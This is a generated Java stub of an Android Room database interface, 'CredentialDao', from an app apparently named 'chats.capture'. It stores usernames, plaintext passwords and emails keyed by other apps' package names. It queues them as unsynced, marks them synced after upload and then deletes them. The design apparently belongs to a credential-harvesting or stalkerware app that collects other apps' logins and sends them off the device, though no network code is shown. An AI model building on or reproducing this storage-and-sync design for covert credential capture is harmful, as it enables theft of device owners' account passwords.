package com.chats.capture.database;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000B\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\t\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\u0010 \n\u0002\b\u0007\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0012\bg\u0018\u00002\u00020\u0001J\u0016\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H\u00a7@\u00a2\u0006\u0002\u0010\u0006J,\u0010\u0007\u001a\u0004\u0018\u00010\b2\b\u0010\t\u001a\u0004\u0018\u00010\n2\b\u0010\u000b\u001a\u0004\u0018\u00010\n2\u0006\u0010\f\u001a\u00020\nH\u00a7@\u00a2\u0006\u0002\u0010\rJ\u0014\u0010\u000e\u001a\u000e\u0012\n\u0012\b\u0012\u0004\u0012\u00020\b0\u00100\u000fH\'J\u001c\u0010\u0011\u001a\b\u0012\u0004\u0012\u00020\b0\u00102\u0006\u0010\u0012\u001a\u00020\nH\u00a7@\u00a2\u0006\u0002\u0010\u0013J\u001c\u0010\u0014\u001a\b\u0012\u0004\u0012\u00020\b0\u00102\u0006\u0010\u0015\u001a\u00020\nH\u00a7@\u00a2\u0006\u0002\u0010\u0013J\u001c\u0010\u0016\u001a\b\u0012\u0004\u0012\u00020\b0\u00102\u0006\u0010\u0017\u001a\u00020\u0018H\u00a7@\u00a2\u0006\u0002\u0010\u0019J\u000e\u0010\u001a\u001a\u00020\u001bH\u00a7@\u00a2\u0006\u0002\u0010\u001cJ\u001e\u0010\u001d\u001a\b\u0012\u0004\u0012\u00020\b0\u00102\b\b\u0002\u0010\u001e\u001a\u00020\u001bH\u00a7@\u00a2\u0006\u0002\u0010\u001fJ\u0016\u0010 \u001a\u00020\u00032\u0006\u0010!\u001a\u00020\bH\u00a7@\u00a2\u0006\u0002\u0010\"J\u001c\u0010#\u001a\u00020\u00032\f\u0010$\u001a\b\u0012\u0004\u0012\u00020\b0\u0010H\u00a7@\u00a2\u0006\u0002\u0010%J\u0016\u0010&\u001a\u00020\u00032\u0006\u0010\'\u001a\u00020\nH\u00a7@\u00a2\u0006\u0002\u0010\u0013J(\u0010(\u001a\u00020\u00032\u0006\u0010\'\u001a\u00020\n2\u0006\u0010)\u001a\u00020\u00052\b\u0010*\u001a\u0004\u0018\u00010\nH\u00a7@\u00a2\u0006\u0002\u0010+J\u0016\u0010,\u001a\u00020\u00032\u0006\u0010!\u001a\u00020\bH\u00a7@\u00a2\u0006\u0002\u0010\"\u00a8\u0006-"}, d2 = {"Lcom/chats/capture/database/CredentialDao;", "", "deleteOldSyncedCredentials", "", "beforeTimestamp", "", "(JLkotlin/coroutines/Continuation;)Ljava/lang/Object;", "findDuplicateCredential", "Lcom/chats/capture/models/Credential;", "appPackage", "", "username", "password", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getAllCredentials", "Lkotlinx/coroutines/flow/Flow;", "", "getCredentialsByApp", "packageName", "(Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getCredentialsByEmail", "email", "getCredentialsByType", "type", "Lcom/chats/capture/models/CredentialType;", "(Lcom/chats/capture/models/CredentialType;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getUnsyncedCount", "", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getUnsyncedCredentials", "limit", "(ILkotlin/coroutines/Continuation;)Ljava/lang/Object;", "insertCredential", "credential", "(Lcom/chats/capture/models/Credential;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "insertCredentials", "credentials", "(Ljava/util/List;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "markAsSynced", "id", "markSyncAttempt", "timestamp", "error", "(Ljava/lang/String;JLjava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "updateCredential", "app_debug"})
@androidx.room.Dao()
public abstract interface CredentialDao {
    
    @androidx.room.Query(value = "SELECT * FROM credentials ORDER BY timestamp DESC")
    @org.jetbrains.annotations.NotNull()
    public abstract kotlinx.coroutines.flow.Flow<java.util.List<com.chats.capture.models.Credential>> getAllCredentials();
    
    @androidx.room.Query(value = "SELECT * FROM credentials WHERE synced = 0 ORDER BY timestamp ASC LIMIT :limit")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getUnsyncedCredentials(int limit, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.util.List<com.chats.capture.models.Credential>> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM credentials WHERE accountType = :type ORDER BY timestamp DESC")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getCredentialsByType(@org.jetbrains.annotations.NotNull()
    com.chats.capture.models.CredentialType type, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.util.List<com.chats.capture.models.Credential>> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM credentials WHERE appPackage = :packageName ORDER BY timestamp DESC")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getCredentialsByApp(@org.jetbrains.annotations.NotNull()
    java.lang.String packageName, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.util.List<com.chats.capture.models.Credential>> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM credentials WHERE email = :email ORDER BY timestamp DESC")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getCredentialsByEmail(@org.jetbrains.annotations.NotNull()
    java.lang.String email, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.util.List<com.chats.capture.models.Credential>> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM credentials WHERE appPackage = :appPackage AND username = :username AND password = :password")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object findDuplicateCredential(@org.jetbrains.annotations.Nullable()
    java.lang.String appPackage, @org.jetbrains.annotations.Nullable()
    java.lang.String username, @org.jetbrains.annotations.NotNull()
    java.lang.String password, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super com.chats.capture.models.Credential> $completion);
    
    @androidx.room.Insert(onConflict = 1)
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object insertCredential(@org.jetbrains.annotations.NotNull()
    com.chats.capture.models.Credential credential, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Insert(onConflict = 1)
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object insertCredentials(@org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.Credential> credentials, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Update()
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object updateCredential(@org.jetbrains.annotations.NotNull()
    com.chats.capture.models.Credential credential, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "UPDATE credentials SET synced = 1 WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object markAsSynced(@org.jetbrains.annotations.NotNull()
    java.lang.String id, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "UPDATE credentials SET synced = 0, syncAttempts = syncAttempts + 1, lastSyncAttempt = :timestamp, errorMessage = :error WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object markSyncAttempt(@org.jetbrains.annotations.NotNull()
    java.lang.String id, long timestamp, @org.jetbrains.annotations.Nullable()
    java.lang.String error, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "SELECT COUNT(*) FROM credentials WHERE synced = 0")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getUnsyncedCount(@org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.lang.Integer> $completion);
    
    @androidx.room.Query(value = "DELETE FROM credentials WHERE synced = 1 AND timestamp < :beforeTimestamp")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object deleteOldSyncedCredentials(long beforeTimestamp, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 3, xi = 48)
    public static final class DefaultImpls {
    }
}